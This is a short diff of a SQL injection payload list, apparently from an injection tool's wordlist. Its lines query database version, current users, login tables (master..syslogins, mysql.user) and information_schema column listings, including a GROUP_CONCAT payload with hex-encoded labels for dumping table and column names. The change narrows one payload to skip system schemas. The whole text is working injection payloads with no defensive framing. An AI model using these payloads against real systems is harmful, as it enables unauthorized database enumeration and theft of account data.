@@ -1,7 +1,7 @@
 @@version
 user
 name from master..syslogins
-table_name+':'+column_name+':'+data_type from information_schema.columns
+table_name+':'+column_name+':'+data_type from information_schema.columns WHERE table_schema != 'mysql' AND table_schema != 'information_schema'
 user()
 user from mysql.user
 MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version FROM information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
